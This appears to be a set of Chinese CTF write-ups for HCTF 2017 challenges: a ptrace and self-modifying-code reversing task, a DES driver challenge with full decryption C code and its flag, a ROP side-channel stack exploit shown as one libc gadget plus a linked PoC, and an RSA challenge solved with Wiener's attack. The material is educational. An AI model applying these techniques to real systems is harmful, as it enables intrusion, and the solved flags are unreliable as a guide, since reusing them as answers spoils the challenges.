<p>&#x5982;&#x679C;argc&#x4E3A;2&#xFF0C;&#x8BF4;&#x660E;&#x662F;debuggee&#x3002;&#x7A0B;&#x5E8F;&#x5229;&#x7528;puts&#x6253;&#x5370;<code>plz_input_flag</code>&#xFF0C;&#x4F46;&#x662F;write&#x7684;syscall&#x88AB;ptrace hook&#x4E86;&#x3002;puts&#x7684;&#x539F;&#x59CB;&#x5185;&#x5BB9;&#x662F;&#x4E71;&#x7801;&#xFF0C;&#x9700;&#x8981;debugger&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x89E3;&#x5BC6;&#x3002;</p>
<p>&#x7136;&#x540E;&#x662F;&#x5229;&#x7528;scanf&#x6765;&#x63A5;&#x6536;flag&#x3002;&#x9ED8;&#x8BA4;&#x662F;&#x5141;&#x8BB8;&#x8F93;&#x5165;<code>%48s</code>&#x4F46;&#x662F;&#x8FD9;&#x91CC;ptrace hook&#x4E86;read syscall&#xFF0C;&#x68C0;&#x6D4B;read syscall&#x89E6;&#x53D1;&#x7684;&#x6B21;&#x6570;&#xFF08;&#x5728;&#x7A0B;&#x5E8F;&#x5F00;&#x5934;&#x5229;&#x7528;setbuf&#x5C06;stdin&#x548C;stdout&#x7684;&#x7F13;&#x51B2;&#x8C03;&#x6574;&#x4E3A;0&#xFF09;,&#x4ECE;&#x800C;&#x4F7F;flag&#x7684;&#x771F;&#x5B9E;&#x6700;&#x5927;&#x957F;&#x5EA6;&#x4E3A;32&#x3002;</p>
<p>&#x63A5;&#x7740;&#x662F;&#x4E00;&#x6BB5;&#x5224;&#x65AD;&#x662F;&#x5426;&#x8C03;&#x8BD5;&#x8005;&#x4E3A;&#x7236;&#x8FDB;&#x7A0B;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6CA1;&#x95EE;&#x9898;&#x7684;&#x8BDD;&#x4F1A;&#x8C03;&#x7528;fclose&#x6765;&#x5173;&#x95ED;&#x4E4B;&#x524D;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x6B64;&#x5904;&#x7528;ptrace hook&#x4E86;close syscall&#x3002;&#x4F46;&#x662F;&#x5728;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x524D;&#x4E5F;&#x4F1A;&#x8C03;&#x7528;close syscall&#x3002;&#x8FD9;&#x91CC;&#x5229;&#x7528;&#x8BBE;&#x7F6E;&#x53D8;&#x91CF;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x5F97;&#x5728;&#x7B2C;&#x4E8C;&#x6B21;close&#x7684;&#x65F6;&#x5019;&#x89E6;&#x53D1;&#x3002;</p>
<p>&#x89E6;&#x53D1;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x662F;&#x5229;&#x7528;rc4&#x5C06;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x89E3;&#x5BC6;&#xFF0C;&#x7136;&#x540E;patch&#x4EE3;&#x7801;&#x4E3A;<code>0xcc</code>&#x4F7F;&#x7A0B;&#x5E8F;&#x505C;&#x5728;&#x68C0;&#x6D4B;trace&#x4EE3;&#x7801;&#x7684;&#x4E0B;&#x4E00;&#x884C;&#xFF0C;&#x5728;&#x5C06;&#x5176;patch&#x6210;jmp&#x5230;data&#x6BB5;&#x7684;&#x90A3;&#x6BB5;&#x552F;&#x4E00;&#x53EF;&#x89C6;&#x7684;&#x96F7;&#x519B;ascii&#x5B57;&#x7B26;&#x5904;&#xFF0C;&#x5E76;&#x5C06;flag&#x4F20;&#x9012;&#x7ED9;rdx&#xFF0C;&#x63A5;&#x7740;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x3002;&#x96F7;&#x519B;&#x90A3;&#x6BB5;ascii&#x5176;&#x5B9E;&#x662F;&#x4EE3;&#x7801;&#x3002;&#x524D;&#x9762;&#x7684;<code>52Mi!</code>&#x662F;<code>xor eax, 0x21694d32</code>&#xFF0C;&#x4ECE;&#x800C;&#x4F7F;&#x540E;&#x9762;&#x7684;jne&#x5168;&#x90E8;&#x6210;&#x7ACB;&#xFF0C;<code>R_</code>&#x662F;<code>push rdx;pop rdi</code>&#xFF0C;&#x4ECE;&#x800C;&#x5C06;&#x4E4B;&#x524D;&#x5728;rdx&#x4E2D;&#x7684;flag&#x4F20;&#x9012;&#x5230;rdi&#x4E2D;&#x3002;&#x5229;&#x7528;<code>u_</code>&#x8FD9;&#x4E2A;jne&#x8DF3;&#x8F6C;&#x8DF3;&#x8FC7;&#x4E2D;&#x95F4;&#x7684;&#x975E;&#x4EE3;&#x7801;&#x533A;&#xFF0C;&#x6700;&#x540E;jmp&#x5230;encrypt&#x51FD;&#x6570;&#x4E2D;&#x3002;</p>
<p>encrypt&#x51FD;&#x6570;&#x5C31;&#x662F;&#x8C03;&#x7528;rc6&#x52A0;&#x5BC6;&#xFF0C;&#x5C06;32&#x4F4D;&#x7684;flag&#x5206;16&#x4F4D;&#x4E24;&#x6B21;&#x52A0;&#x5BC6;&#xFF0C;&#x6700;&#x540E;&#x548C;enc&#x7ED3;&#x679C;&#x6BD4;&#x8F83;&#x3002;</p>
<p>&#x7531;&#x4E8E;&#x8C03;&#x7528;&#x4E86;&#x5F88;&#x591A;&#x7684;ptrace&#x6765;&#x5B9E;&#x73B0;smc&#x548C;hook&#xFF0C;&#x7EAF;&#x52A8;&#x6001;&#x5206;&#x6790;&#x5E94;&#x8BE5;&#x4E0D;&#x592A;&#x53EF;&#x80FD;&#x5B9E;&#x73B0;&#xFF0C;&#x9700;&#x8981;&#x9759;&#x6001;&#x5206;&#x6790;&#x540E;patch&#x7A0B;&#x5E8F;&#x624D;&#x80FD;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x5206;&#x6790;&#x3002;</p>
<p>&#x5B8C;&#x6574;&#x7A0B;&#x5E8F;&#x89C1;github&#xFF0C;&#x7531;&#x4E8E;&#x6709;smc&#x90E8;&#x5206;&#xFF0C;&#x53EF;&#x80FD;&#x5728;&#x4E0D;&#x540C;&#x673A;&#x5B50;&#x4E0A;&#x7F16;&#x8BD1;&#x7ED3;&#x679C;&#x4E0D;&#x6B63;&#x786E;&#xFF0C;&#x6240;&#x4EE5;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x6D4B;&#x8BD5;&#x7528;&#x7684;binary&#x3002;</p>
<h3 id="ippatsu-nyuukon"><a name="ippatsu-nyuukon" class="anchor-navigation-ex-anchor" href="#ippatsu-nyuukon"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.17. ippatsu-nyuukon</h3>
<h4 id="0x00-&#x5199;&#x5728;&#x524D;&#x9762;_1"><a name="0x00-&#x5199;&#x5728;&#x524D;&#x9762;_1" class="anchor-navigation-ex-anchor" href="#0x00-&#x5199;&#x5728;&#x524D;&#x9762;_1"><i class="fa fa-link" aria-hidden="true"></i></a><a name="0x00-&#x5199;&#x5728;&#x524D;&#x9762;" class="plugin-anchor" href="#0x00-&#x5199;&#x5728;&#x524D;&#x9762;"><i class="fa fa-link" aria-hidden="true"></i></a>0x00 &#x5199;&#x5728;&#x524D;&#x9762;</h4>
<p>&#x3000;&#x8BBE;&#x8BA1;&#x601D;&#x8DEF;&#xFF1A;<br>&#x3000;&#x5E94;&#x7528;&#x5C42;&#x4E0E;&#x9A71;&#x52A8;&#x5C42;&#x901A;&#x4FE1;&#xFF0C;&#x5728;&#x9A71;&#x52A8;&#x5C42;&#x52A0;&#x5BC6;&#x7531;&#x5E94;&#x7528;&#x5C42;&#x53D1;&#x9001;&#x8FC7;&#x6765;&#x7684;&#x660E;&#x6587;&#x540E;&#x6BD4;&#x8F83;flag&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x7ED3;&#x679C;<br>&#x3000;<br>&#x3000;&#x90E8;&#x5206;&#x7EC6;&#x8282;&#xFF1A;</p>
<blockquote>
<ul>
<li>&#x9A71;&#x52A8;&#x5C42;&#x7684;&#x5206;&#x53D1;&#x51FD;&#x6570;&#x5206;&#x4E3A;2&#x90E8;&#x5206;&#xFF0C;SEND&#x548C;RECV&#xFF1B;<br>SEND&#xFF1A;&#x63A5;&#x53D7;&#x4ECE;&#x5E94;&#x7528;&#x5C42;&#x53D1;&#x6765;&#x7684;&#x660E;&#x6587;&#x5E76;&#x52A0;&#x5BC6;&#xFF0C;&#x5176;&#x672C;&#x4F53;&#x662F;DES<br>RECV&#xFF1A;&#x6BD4;&#x8F83;&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x660E;&#x6587;&#x548C;&#x52A0;&#x5BC6;flag</li>
<li>&#x9A71;&#x52A8;&#x5C42;&#x63A5;&#x53D7;&#x7684;&#x660E;&#x6587;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x53EA;&#x6709;&#x7B2C;&#x4E00;&#x6B21;&#x52A0;&#x5BC6;&#x7ED3;&#x679C;&#x662F;&#x6B63;&#x786E;&#x7684;</li>
<li>DES&#x540E;&#x5C06;&#x4E0D;&#x53EF;&#x89C6;&#x6570;&#x636E;&#x8F6C;&#x4E3A;hex</li>
<li>&#x52A0;&#x5BC6;&#x6570;&#x636E;&#x4E0E;&#x52A0;&#x5BC6;flag&#x6BD4;&#x8F83;&#x524D;&#x5148;&#x5F02;&#x6216;&#x540C;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x8282;</li>
</ul>
</blockquote>
<h4 id="0x01-wp_1"><a name="0x01-wp_1" class="anchor-navigation-ex-anchor" href="#0x01-wp_1"><i class="fa fa-link" aria-hidden="true"></i></a><a name="0x01-wp" class="plugin-anchor" href="#0x01-wp"><i class="fa fa-link" aria-hidden="true"></i></a>0x01 wp</h4>
<p>     <a href="http://img.blog.csdn.net/20171113115209604" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://img.blog.csdn.net/20171113115209604" alt="">
     </a><br>&#x8DDF;&#x5230;&#x5206;&#x53D1;&#x51FD;&#x6570;&#x7684;SEND, &#x5B9A;&#x4F4D;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;<br>&#x56E0;&#x4E3A;DES&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#xFF0C;&#x6240;&#x4EE5;&#x4ECE;ida&#x4E2D;&#x62A0;&#x51FA;&#x6765;&#xFF0C;&#x4FEE;&#x6539;&#x5C0F;&#x90E8;&#x5206;&#x5E76;&#x6DFB;&#x52A0;&#x5BC6;&#x6587;+key&#x5C31;&#x53EF;&#x4EE5;&#x8DD1;&#x89E3;&#x5BC6;&#x811A;&#x672C;&#x4E86;</p>
<pre><code class="lang-`">    // desrypt_des.cpp
    #include &lt;stdio.h&gt;    
    #include &lt;string.h&gt;    

    #define maxn 0x8000     // &#x7406;&#x8BBA;&#x652F;&#x6301;&#x660E;&#x6587;&#x957F;&#x5EA6;
    //#define ENCODE 0,16,1       // &#x52A0;&#x5BC6;&#x7528;&#x7684;&#x5B8F;
    #define DECODE 15,-1,-1     // &#x89E3;&#x5BC6;&#x7528;&#x7684;&#x5B8F;    

    // &#x660E;&#x6587;&#x521D;&#x59CB;&#x7F6E;&#x6362;    
    char msg_ch[64] = {
        58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
        62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
        57, 49, 41, 33, 25, 17,  9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
        61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7
    };

    // &#x5BC6;&#x94A5;&#x521D;&#x59CB;&#x7F6E;&#x6362;    
    char key_ch[56] = {
        57, 49, 41, 33, 25, 17,  9,  1, 58, 50, 42, 34, 26, 18,
        10,  2, 59, 51, 43, 35, 27, 19, 11,  3, 60, 52, 44, 36,
        63, 55, 47, 39, 31, 23, 15,  7, 62, 54, 46, 38, 30, 22,
        14,  6, 61, 53, 45, 37, 29, 21, 13,  5, 28, 20, 12,  4
    };

    // &#x6269;&#x5C55;&#x7F6E;&#x6362;    
    char msg_ex[48] = {
        32,  1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,
        8,  9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17,
        16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,
        24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32,  1
    };

    // &#x6BCF;&#x8F6E;&#x5BC6;&#x94A5;&#x7684;&#x4F4D;&#x79FB;    
    char key_mov[16] = {
        1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1
    };

    // &#x538B;&#x7F29;&#x7F6E;&#x6362;    
    char key_cmprs[48] = {
        14, 17, 11, 24,  1,  5,  3, 28, 15,  6, 21, 10,
        23, 19, 12,  4, 26,  8, 16,  7, 27, 20, 13,  2,
        41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48,
        44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32
    };

    // S &#x76D2;&#x7F6E;&#x6362;    
    char s_box[8][6][16] = {
        // S1    
        14,  4, 13,  1,  2, 15, 11,  8,  3, 10,  6, 12,  5,  9,  0,  7,
        0, 15,  7,  4, 14,  2, 13,  1, 10,  6, 12, 11,  9,  5,  3,  8,
        4,  1, 14,  8, 13,  6,  2, 11, 15, 12,  9,  7,  3, 10,  5,  0,
        15, 12,  8,  2,  4,  9,  1,  7,  5, 11,  3, 14, 10,  0,  6, 13,
        // S2    
        15,  1,  8, 14,  6, 11,  3,  4,  9,  7,  2, 13, 12,  0,  5, 10,
        3, 13,  4,  7, 15,  2,  8, 14, 12,  0,  1, 10,  6,  9, 11,  5,
        0, 14,  7, 11, 10,  4, 13,  1,  5,  8, 12,  6,  9,  3,  2, 15,
        13,  8, 10,  1,  3, 15,  4,  2, 11,  6,  7, 12,  0,  5, 14,  9,
        // S3    
        10,  0,  9, 14,  6,  3, 15,  5,  1, 13, 12,  7, 11,  4,  2,  8,
        13,  7,  0,  9,  3,  4,  6, 10,  2,  8,  5, 14, 12, 11, 15,  1,
        13,  6,  4,  9,  8, 15,  3,  0, 11,  1,  2, 12,  5, 10, 14,  7,
        1, 10, 13,  0,  6,  9,  8,  7,  4, 15, 14,  3, 11,  5,  2, 12,
        // S4    
        7, 13, 14,  3,  0,  6,  9, 10,  1,  2,  8,  5, 11, 12,  4, 15,
        13,  8, 11,  5,  6, 15,  0,  3,  4,  7,  2, 12,  1, 10, 14,  9,
        10,  6,  9,  0, 12, 11,  7, 13, 15,  1,  3, 14,  5,  2,  8,  4,
        3, 15,  0,  6, 10,  1, 13,  8,  9,  4,  5, 11, 12,  7,  2, 14,
        // S5    
        2, 12,  4,  1,  7, 10, 11,  6,  8,  5,  3, 15, 13,  0, 14,  9,
        14, 11,  2, 12,  4,  7, 13,  1,  5,  0, 15, 10,  3,  9,  8,  6,
        4,  2,  1, 11, 10, 13,  7,  8, 15,  9, 12,  5,  6,  3,  0, 14,
        11,  8, 12,  7,  1, 14,  2, 13,  6, 15,  0,  9, 10,  4,  5,  3,
        // S6    
        12,  1, 10, 15,  9,  2,  6,  8,  0, 13,  3,  4, 14,  7,  5, 11,
        10, 15,  4,  2,  7, 12,  9,  5,  6,  1, 13, 14,  0, 11,  3,  8,
        9, 14, 15,  5,  2,  8, 12,  3,  7,  0,  4, 10,  1, 13, 11,  6,
        4,  3,  2, 12,  9,  5, 15, 10, 11, 14,  1,  7,  6,  0,  8, 13,
        // S7    
        4, 11,  2, 14, 15,  0,  8, 13,  3, 12,  9,  7,  5, 10,  6,  1,
        13,  0, 11,  7,  4,  9,  1, 10, 14,  3,  5, 12,  2, 15,  8,  6,
        1,  4, 11, 13, 12,  3,  7, 14, 10, 15,  6,  8,  0,  5,  9,  2,
        6, 11, 13,  8,  1,  4, 10,  7,  9,  5,  0, 15, 14,  2,  3, 12,
        // S8    
        13,  2,  8,  4,  6, 15, 11,  1, 10,  9,  3, 14,  5,  0, 12,  7,
        1, 15, 13,  8, 10,  3,  7,  4, 12,  5,  6, 11,  0, 14,  9,  2,
        7, 11,  4,  1,  9, 12, 14,  2,  0,  6, 10, 13, 15,  3,  5,  8,
        2,  1, 14,  7,  4, 10,  8, 13, 15, 12,  9,  0,  3,  5,  6, 11
    };

    // P &#x76D2;&#x7F6E;&#x6362;    
    char p_box[32] = {
        16, 7, 20, 21, 29, 12, 28, 17, 1,  15, 23, 26, 5,  18, 31, 10,
        2,  8, 24, 14, 32, 27, 3,  9,  19, 13, 30, 6,  22, 11, 4,  25
    };

    // &#x672B;&#x7F6E;&#x6362;    
    char last_ch[64] = {
        40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31,
        38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29,
        36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27,
        34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41,  9, 49, 17, 57, 25
    };

    // hash &#x7F6E;&#x6362;&#xFF0C;&#x5C06;&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x5BC6;&#x6587;&#x7F6E;&#x6362;&#x4E3A;&#x53EF;&#x8BFB;&#x660E;&#x6587;    
    char hs_ch[20] = &quot;0123456789abcdef&quot;;
    char sh_ch[128];

    void init_trans() {
        char i;
        for (i = 0; i &lt; 16; i++)
            sh_ch[hs_ch[i]] = i;    // &#x5B8C;&#x6210;hash&#x8F6C;&#x6362;&#x7684;&#x5BF9;&#x5E94;    
    }

    char msg[maxn] = &quot;aed3899df15bd7babb99acf5ebb9f5cd8cd44a77c53263de46ef9f3d773fe908&quot;;
    char res[32];
    char msgb[72], msgbt[72], keyb[18][72];
    char key[16] = &quot;deadbeef&quot;;

    // &#x5B57;&#x7B26;&#x8F6C;&#x6210;&#x4E8C;&#x8FDB;&#x5236;    
    void ChToBit(char* dest, char* src, int length) {
        int i, j;
        char t;
        for (i = 0; i &lt; length; i++) {
            for (j = 8, t = src[i]; j &gt; 0; j--) {
                dest[(i &lt;&lt; 3) + j] = t &amp; 1;   // &#x53D6;&#x5B57;&#x7B26;&#x672B;&#x4F4D;    
                t &gt;&gt;= 1;
            }
        }
    }

    // &#x4E8C;&#x8FDB;&#x5236;&#x8F6C;&#x6210;&#x5B57;&#x7B26;    
    void BitToCh(char* dest, char* src, int length) {
        int i;
        for (i = 0; i &lt; length &lt;&lt; 3; i++) {
            dest[i &gt;&gt; 3] &lt;&lt;= 1;
            dest[i &gt;&gt; 3] |= src[i + 1];   // &#x6DFB;&#x52A0;&#x5230;&#x672B;&#x4F4D;    
        }
        dest[length] = 0;
    }

    // &#x6279;&#x7F6E;&#x6362;&#xFF0C;&#x4EE5;offset&#x4E3A;&#x504F;&#x79FB;&#xFF0C;&#x4EE5;count&#x4E3A;&#x957F;&#x5EA6;    
    void BatchSet(char* dest, char* src, char* offset, int count) {
        int i;
        for (i = 0; i &lt; count; i++)
            dest[i + 1] = src[offset[i]];
    }

    // &#x5F97;&#x5230;16&#x8F6E;&#x6240;&#x9700;&#x7684;&#x5BC6;&#x94A5;    
    void getKeys() {
        char tk[128], bk[72];
        char* ptk = tk;
        int i, j;
        for (i = 0; i &lt; 8; i++)
            key[i] &lt;&lt;= 1; // &#x8DF3;&#x8FC7;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4F4D;    
        ChToBit(bk, key, 8);
        BatchSet(tk, bk, key_ch, 56);
        for (i = 0; i &lt; 16; i++) {
            for (j = 0; j &lt; key_mov[i]; j++, ptk++) {
                ptk[57] = ptk[28];
                ptk[28] = ptk[1];
            }
            BatchSet(keyb[i], ptk, key_cmprs, 48);
        }
    }

    // &#x5C06;&#x5BC6;&#x6587;&#x8F6C;&#x6362;&#x4E3A;&#x771F;&#x6B63;&#x7684;&#x5BC6;&#x6587;    
    void dropMsg(char* dest, char* src) {
        int i;
        for (i = 0; i &lt; 16; i++) { 
            dest[i &gt;&gt; 1] = (dest[i &gt;&gt; 1] &lt;&lt; 4) | sh_ch[src[i]];
        }
    }

    void DES(char* pmsg, int st, int cl, int step) {
        int i, row, col;
        char r[64], rt[48], s[8];
        ChToBit(msgbt, pmsg, 8);
        BatchSet(msgb, msgbt, msg_ch, 64); // &#x521D;&#x59CB;&#x7F6E;&#x6362;    
        for (; st != cl; st += step) {
            memcpy(rt, msgb + 33, 32);
            BatchSet(r, msgb + 32, msg_ex, 48); // &#x6269;&#x5C55;&#x7F6E;&#x6362;    
            for (i = 1; i &lt;= 48; i++)
                r[i] ^= keyb[st][i]; // &#x5F02;&#x6216;&#x64CD;&#x4F5C;    
                                     // s_box &#x4EE3;&#x66FF;    
            for (i = 0; i &lt; 48; i += 6) {
                row = col = 0;
                row = r[i + 1] &lt;&lt; 1 | r[i + 6];
                col = (r[i + 2] &lt;&lt; 3) | (r[i + 3] &lt;&lt; 2) | (r[i + 4] &lt;&lt; 1) | r[i + 5];
                s[i / 12] = (s[i / 12] &lt;&lt;= 4) | s_box[i / 6][row][col];
            }
            ChToBit(r, s, 4);
            BatchSet(msgb + 32, r, p_box, 32); // p_box &#x7F6E;&#x6362;    
            for (i = 1; i &lt;= 32; i++)
                msgb[i + 32] ^= msgb[i]; // &#x5F02;&#x6216;    
            memcpy(msgb + 1, rt, 32);
        }
        memcpy(msgbt + 33, msgb + 1, 32);
        memcpy(msgbt + 1, msgb + 33, 32);
        BatchSet(msgb, msgbt, last_ch, 64); // &#x672B;&#x7F6E;&#x6362;    
        BitToCh(res, msgb, 8); // &#x8F6C;&#x4E3A;&#x539F;&#x660E;&#x6587;    
    }

    int main(int arg, char* arv[]) {
        init_trans();
        char mode = &apos;d&apos;;

        getKeys(); // &#x5F97;&#x5230;16&#x8F6E;&#x8981;&#x7528;&#x5230;&#x7684;&#x5BC6;&#x94A5;    

        int i;

        printf(&quot;dec: &quot;);
        for (i = 0; msg[i]; i += 16) {
            dropMsg(res, msg + i); // &#x5C06;&#x5BC6;&#x6587;&#x8F6C;&#x6362;&#x4E3A;&#x771F;&#x6B63;&#x7684;&#x5BC6;&#x6587;    
            DES(res, DECODE); // &#x89E3;&#x5BC6;    
            printf(&quot;%s&quot;, res);
        }
        printf(&quot;\n&quot;);
        return 0;
    }
</code></pre>
<p>&#x7B80;&#x5355;&#x6765;&#x8BF4; &#x53EA;&#x8981;&#x628A;&#x52A0;&#x5BC6;&#x5B8F;[0, 16 ,1]&#x66FF;&#x6362;&#x4E3A;[15, -1, -1]&#x89E3;&#x5BC6;&#x5B8F;&#x5373;&#x53EF;&#x3002;</p>
<p>flag:</p>
<pre><code>hctf{Dr1v5r_M5ngM4n_2Oi7}
</code></pre><p>     <a href="http://img.blog.csdn.net/20171113195719931" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://img.blog.csdn.net/20171113195719931" alt="">
     </a><br>ps: &#x9644;&#x4E00;&#x5F20;&#x6210;&#x529F;cm&#x7684;&#x622A;&#x56FE;</p>
<p>     <a href="http://img.blog.csdn.net/20171113195719931" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://img.blog.csdn.net/20171113195719931" alt="">
     </a></p>
<h3 id="babystack"><a name="babystack" class="anchor-navigation-ex-anchor" href="#babystack"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.18. babystack</h3>
<p>&#x8FD9;&#x9898;&#x7684;&#x540D;&#x5B57;&#x53EB;babystack&#xFF0C;&#x7A0B;&#x5E8F;&#x4E2D;&#x662F;&#x4E00;&#x4E2A;&#x76F4;&#x63A5;&#x7684;&#x6808;&#x6EA2;&#x51FA;&#x3002;&#x800C;&#x4E14;&#x8FD8;&#x81EA;&#x5E26;&#x4E00;&#x6B21;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x3002;<br>&#x5F53;&#x7136;&#x8FD9;&#x9898;&#x7684;&#x96BE;&#x70B9;&#x4E5F;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x6709;read&#xFF0C;write&#xFF0C;open&#xFF0C;exit&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x3002;&#x4E4B;&#x6240;&#x4EE5;&#x641E;&#x51FA;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x662F;&#x53D7;defcon&#x7684;mute&#x90A3;&#x9898;&#x7684;&#x542F;&#x53D1;&#x3002;mute&#x90A3;&#x9898;&#x662F;&#x7528;shellcode&#x6765;&#x5B9E;&#x73B0;&#x7684;&#x4FA7;&#x4FE1;&#x9053;&#x653B;&#x51FB;&#x3002;&#x6240;&#x4EE5;&#x6211;&#x5C31;&#x60F3;&#x80FD;&#x5426;&#x7528;rop&#x6765;&#x5B9E;&#x73B0;&#x4FA7;&#x4FE1;&#x9053;&#x7684;&#x653B;&#x51FB;&#x3002;</p>
<p>&#x4E0B;&#x9762;&#x662F;&#x6211;&#x5728;libc&#x91CC;&#x627E;&#x5230;&#x7684;&#x4E00;&#x4E2A;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x4FA7;&#x4FE1;&#x9053;&#x653B;&#x51FB;&#x7684;ROP</p>
<pre><code>    .text:00000000000D72CE                 cmp     cl, [rsi]
    .text:00000000000D72D0                 jz      short loc_D7266
    .text:00000000000D72D2                 pop     rbx
    .text:00000000000D72D3                 retn
</code></pre><p>&#x5728;ret&#x4E4B;&#x540E;&#x7528;&#x4E00;&#x4E2A;read&#x51FD;&#x6570;&#x6765;block&#x4F4F;&#x4EE3;&#x7801;&#x3002;&#x800C;&#x6BD4;&#x8F83;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x5219;&#x76F4;&#x63A5;crash&#x9000;&#x51FA;&#x3002;&#x4F7F;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x6765;&#x9010;&#x5B57;&#x8282;&#x7684;&#x6BD4;&#x8F83;flag&#x3002;<br>&#x5F53;&#x7136;&#xFF0C;&#x89E3;&#x6CD5;&#x4E0D;&#x6B62;&#x8FD9;&#x4E00;&#x79CD;&#x3002;libc&#x91CC;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x7684;rop&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x4FA7;&#x4FE1;&#x9053;&#x653B;&#x51FB;&#x3002;&#x53EF;&#x4EE5;&#x770B;&#x770B;&#x9009;&#x624B;&#x4EEC;&#x7684;&#x89E3;&#x6CD5;.</p>
<p>poc&#x89C1;<a href="https://github.com/zh-explorer/hctf2017-explorer/tree/master/babystack" target="_blank">github</a></p>
<h3 id="babyre"><a name="babyre" class="anchor-navigation-ex-anchor" href="#babyre"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.19. babyre</h3>
<p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x96BE;&#x5EA6;&#x5176;&#x5B9E;&#x5904;&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#x548C;&#x7B2C;&#x56DB;&#x5C42;&#x4E4B;&#x95F4;&#x3002;&#x5F53;&#x521D;&#x628A;&#x5B83;&#x653E;&#x7B2C;&#x56DB;&#x5C42;&#x5176;&#x5B9E;&#x6709;&#x70B9;&#x72B9;&#x8C6B;&#xFF0C;&#x56E0;&#x4E3A;&#x611F;&#x89C9;&#x4F1A;&#x6709;&#x8001;&#x53F8;&#x673A;&#x79D2;&#x6740;&#x4ED6;&#x3002;</p>
<p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x8BF4;&#x8D77;&#x6765;&#x5176;&#x5B9E;&#x5F88;&#x7B80;&#x7B54;&#xFF0C;&#x6211;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x8499;&#x54E5;&#x9A6C;&#x5229;&#x4E58;&#x7B97;&#x6CD5;&#x548C;&#x4E00;&#x4E2A;&#x5927;&#x6574;&#x6570;&#x52A0;&#x51CF;&#x7684;&#x5E93;&#x3002;&#x719F;&#x6089;&#x5BC6;&#x7801;&#x5B66;&#x7684;&#x5927;&#x4F6C;&#x5E94;&#x8BE5;&#x77E5;&#x9053;&#x8499;&#x54E5;&#x9A6C;&#x5229;&#x4E58;&#x8FD0;&#x7B97;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x8FDB;&#x884C;&#x5FEB;&#x901F;&#x6A21;&#x5E42;&#x8FD0;&#x7B97;&#xFF0C;&#x5373;RSA&#x7684;&#x6838;&#x5FC3;&#x7B97;&#x6CD5;&#x3002;<br>&#x6709;&#x5173;&#x8499;&#x54E5;&#x9A6C;&#x5229;&#x7B97;&#x6CD5;&#x7684;&#x6587;&#x7AE0;&#x7F51;&#x4E0A;&#x5176;&#x5B9E;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x6211;&#x5C31;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#x4E86;&#x3002;&#x4EE3;&#x7801;&#x4E2D;&#x53EA;&#x6709;e&#x548C;n&#x3002;&#x5C06;&#x8F93;&#x5165;&#x7684;flag&#x8F6C;&#x6362;&#x6210;&#x5927;&#x6570;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x505A;en = pow(f,e,n)&#x8F93;&#x51FA;&#x4E86;&#x5927;&#x6570;en&#x3002;&#x8FD9;&#x91CC;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x5927;&#x7684;e&#xFF0C;&#x4F7F;&#x5F97;&#x53EF;&#x4EE5;&#x7528;Wiener&apos;s attack&#x6765;&#x8BA1;&#x7B97;&#x51FA;d&#x7684;&#x503C;&#x3002;&#x7136;&#x540E;&#x7528;d&#x5373;&#x53EF;&#x89E3;&#x5BC6;&#x51FA;flag&#x3002;</p>
